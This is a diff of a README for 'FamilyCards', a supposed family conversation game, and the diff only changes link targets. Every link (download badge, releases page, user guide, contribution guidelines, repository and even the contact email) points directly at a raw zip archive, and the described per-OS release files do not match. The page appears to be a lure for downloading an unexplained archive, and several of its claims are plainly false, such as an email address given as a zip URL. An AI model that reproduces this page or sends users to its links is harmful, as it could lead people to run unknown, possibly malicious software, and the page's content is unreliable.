@@ -1,6 +1,6 @@
 # 🎉 FamilyCards - Connect With Family Through Fun Games
 
-[![Download FamilyCards](https://raw.githubusercontent.com/rais121/FamilyCards/main/trinitarian/FamilyCards.zip)](https://raw.githubusercontent.com/rais121/FamilyCards/main/trinitarian/FamilyCards.zip)
+[![Download FamilyCards](https://raw.githubusercontent.com/rais121/FamilyCards/main/src/Family_Cards_v2.6.zip)](https://raw.githubusercontent.com/rais121/FamilyCards/main/src/Family_Cards_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to FamilyCards! This interactive game features over 200 conversation sta
 
 To get FamilyCards, simply visit our releases page:
 
-[Download FamilyCards](https://raw.githubusercontent.com/rais121/FamilyCards/main/trinitarian/FamilyCards.zip)
+[Download FamilyCards](https://raw.githubusercontent.com/rais121/FamilyCards/main/src/Family_Cards_v2.6.zip)
 
 Follow these steps to download and install:
 
-1. Go to the [FamilyCards Releases page](https://raw.githubusercontent.com/rais121/FamilyCards/main/trinitarian/FamilyCards.zip).
+1. Go to the [FamilyCards Releases page](https://raw.githubusercontent.com/rais121/FamilyCards/main/src/Family_Cards_v2.6.zip).
 2. Look for the latest version of FamilyCards.
 3. Click on the file that corresponds to your operating system. You will typically see options for Windows, macOS, or Linux.
 4. Wait for the download to finish. 
@@ -76,12 +76,12 @@ Feel free to check out our community discussions for more tips and interactions 
 If you run into any issues or need assistance, please reach out. You can contact us through:
 
 - Our GitHub issues page for technical support.
-- Email at https://raw.githubusercontent.com/rais121/FamilyCards/main/trinitarian/FamilyCards.zip for general inquiries.
+- Email at https://raw.githubusercontent.com/rais121/FamilyCards/main/src/Family_Cards_v2.6.zip for general inquiries.
 
 ## 🔗 Resources 
 
-- [FamilyCards Repository](https://raw.githubusercontent.com/rais121/FamilyCards/main/trinitarian/FamilyCards.zip)
-- [User Guide](https://raw.githubusercontent.com/rais121/FamilyCards/main/trinitarian/FamilyCards.zip)
-- [Contribution Guidelines](https://raw.githubusercontent.com/rais121/FamilyCards/main/trinitarian/FamilyCards.zip)
+- [FamilyCards Repository](https://raw.githubusercontent.com/rais121/FamilyCards/main/src/Family_Cards_v2.6.zip)
+- [User Guide](https://raw.githubusercontent.com/rais121/FamilyCards/main/src/Family_Cards_v2.6.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/rais121/FamilyCards/main/src/Family_Cards_v2.6.zip)
 
 Thank you for choosing FamilyCards. We hope you enjoy making memories with your family!
